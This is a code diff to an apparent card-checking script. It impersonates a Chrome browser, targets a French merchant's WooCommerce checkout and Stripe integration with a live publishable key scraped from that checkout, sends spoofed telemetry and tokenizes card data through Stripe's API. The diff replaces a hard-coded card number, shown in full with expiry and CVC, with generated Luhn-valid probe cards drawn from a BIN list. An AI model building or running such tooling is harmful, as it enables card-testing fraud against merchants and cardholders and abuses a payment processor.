@@ -4,6 +4,12 @@ import asyncio, json
 from curl_cffi.requests import AsyncSession
 import gate_client as gc
 
+def _probe_card() -> str:
+    """Luhn-валидный пробник вместо литерала PAN (Фиксация №25: карты в репозитории не держим)."""
+    import random
+    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
+    return f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"
+
 async def test():
     async with AsyncSession(impersonate='chrome120') as s:
         api = 'https://kanten.fr/wp-json/wc/store/v1'
@@ -15,7 +21,7 @@ async def test():
         
         # real pk from checkout
         pk = 'pk_live_51Fr5r3K4R0TZzBJXPaf2M3s1ZdQdjvUBPn30uQYGKTH5B8fMgmLBUpAJv2DZC224ndVUhrB82feF6wUulCFptKtu00F9sCZuwS'
-        card = gc.parse_card('4559516073479539|01|2029|277')
+        card = gc.parse_card(_probe_card())
         telem = gc.stripe_telemetry('https://kanten.fr', pk)
         tok_b = gc.tokenize_body(card, telem, 'https://kanten.fr')
         r_tok = await s.post('https://api.stripe.com/v1/payment_methods', data=tok_b, headers=gc.TOKENIZE_HEADERS)
